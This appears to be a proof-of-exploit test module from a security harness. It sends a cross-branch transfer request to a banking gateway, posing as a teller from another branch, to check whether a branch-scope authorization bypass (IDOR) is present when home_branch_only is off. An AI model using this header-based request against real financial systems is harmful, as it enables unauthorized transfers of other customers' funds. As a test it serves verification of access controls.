"""LG-AC-001 proof-of-exploit: branch-scope bypass (IDOR).

A branch-0007 teller posts against account 000000000077, which belongs to branch 0014. Fires when
that cross-branch transfer is accepted (status=POSTED), which is only possible with
home_branch_only=off. Under home_branch_only=on it is rejected "OUT OF BRANCH SCOPE" (inert).
Env: GATEWAY_URL.
"""

from harness import env, http


def fire():
    reply = http.post_json(
        f"{env.url('GATEWAY_URL')}/transfer",
        {"token": "TRIGGERTOKEN0001", "from_account": "000000000077", "to_account": "000000000043",
         "amount": "100.00", "currency": "USD", "requested_by": "0000000007"},
        headers={"X-Staff-Id": "TLR001", "X-Role": "TELLER", "X-Branch": "0007"},
    )
    if reply.json().get("status") == "POSTED":
        return True, f"cross-branch transfer POSTED -> {reply.text}"
    return False, f"branch scope enforced: {reply.text}"
